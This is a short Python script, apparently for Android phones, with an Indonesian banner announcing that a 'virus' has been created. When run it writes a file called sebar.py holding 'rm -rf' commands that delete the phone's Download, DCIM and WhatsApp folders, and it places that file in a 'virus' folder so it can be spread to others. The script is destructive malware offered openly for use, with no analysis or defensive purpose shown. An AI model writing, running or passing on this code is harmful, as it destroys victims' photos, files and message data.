import os
from time import sleep
import py_compile

try:
    virus= "import os\nos.system('rm -rf /storage/emulated/0/Download')\nos.system('rm -rf /storage/emulated/0/DCIM')\nos.system('rm -rf /storage/emulated/0/WhatsApp')"
    f=open('sebar.py','w')
    f.write(virus)
    f.close()

    os.system('mkdir virus')
    os.system('mv sebar.py virus')
except:
    pass

def banner():
   os.system('clear')
   print ('\033[1;31m\t╔═╗╔═╗╔╗ ╔═╗╦═╗  ╔═╗╔╗╔ ╦╔═╗╦ ╦')
   print ('\033[1;36m\t╚═╗║╣ ╠╩╗╠═╣╠╦╝  ╠═╣║║║ ║╠═╣╚╦╝')
   print ('\033[1;31m\t╚═╝╚═╝╚═╝╩ ╩╩╚═  ╩ ╩╝╚╝╚╝╩ ╩ ╩')
   print ('\x1b[5;37;41m\t[✓]sebar anjay sebarin anjayy[✓]\x1b[0m')
   print ('\n\033[1;32m[✓]\033[1;33mvirus dibuat dalam 10 detik')
   sleep(10)
   print ('\033[1;32m[✓]\033[1;33mvirus sukses dibuat')

if __name__=='__main__':
   banner()
